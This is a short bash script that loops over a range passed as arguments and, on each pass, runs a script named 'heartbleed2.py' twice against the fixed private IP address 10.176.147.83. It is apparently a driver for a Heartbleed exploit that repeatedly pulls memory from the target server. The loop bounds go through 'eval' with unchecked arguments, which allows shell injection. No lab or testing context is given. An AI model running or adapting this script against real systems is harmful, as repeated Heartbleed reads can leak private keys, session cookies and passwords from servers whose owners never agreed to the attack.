#!/bin/bash


for i in $(eval echo {$1..$2})
do
sleep 2 
python heartbleed2.py 10.176.147.83
python heartbleed2.py 10.176.147.83

sleep 1
done
